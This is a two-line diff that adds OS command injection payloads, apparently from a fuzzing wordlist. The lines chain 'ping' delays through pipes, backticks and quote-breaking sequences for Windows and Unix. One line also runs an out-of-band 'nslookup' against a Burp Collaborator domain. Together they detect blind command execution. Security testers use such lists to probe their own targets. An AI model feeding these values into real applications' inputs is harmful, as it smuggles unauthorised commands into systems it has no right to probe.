@@ -1,0 +1,2 @@
+|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1 
+|nslookup -q=cname my.burpcollaborator.net.&
